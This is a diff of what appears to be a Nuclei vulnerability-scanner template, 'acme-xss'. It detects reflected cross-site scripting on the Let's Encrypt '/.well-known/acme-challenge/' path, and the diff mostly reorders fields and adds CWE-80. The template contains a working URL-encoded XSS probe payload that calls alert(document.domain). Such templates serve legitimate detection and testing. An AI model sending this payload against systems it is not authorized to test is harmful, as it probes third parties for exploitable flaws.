@@ -1,5 +1,4 @@
 id: acme-xss
-
 info:
   name: Let's Encrypt - Cross-Site Scripting
   author: pdteam
@@ -11,24 +10,20 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
     cvss-score: 7.2
-    cwe-id: CWE-79
+    cwe-id: CWE-79,CWE-80
   metadata:
     max-request: 1
-  tags: xss,acme,vuln
-
+  tags: acme,vuln,xss
 http:
-  - method: GET
+  - matchers:
+      - type: word
+        words:
+          - <?xml version="1.0"?><x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>
+      - type: word
+        words:
+          - /xml
+          - /html
+    matchers-condition: and
+    method: GET
     path:
       - '{{BaseURL}}/.well-known/acme-challenge/%3C%3fxml%20version=%221.0%22%3f%3E%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%3Ealert%28document.domain%26%23x29%3B%3C/x:script%3E'
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        words:
-          - "<?xml version=\"1.0\"?><x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)</x:script>"
-
-      - type: word
-        words:
-          - "/xml"
-          - "/html"
-
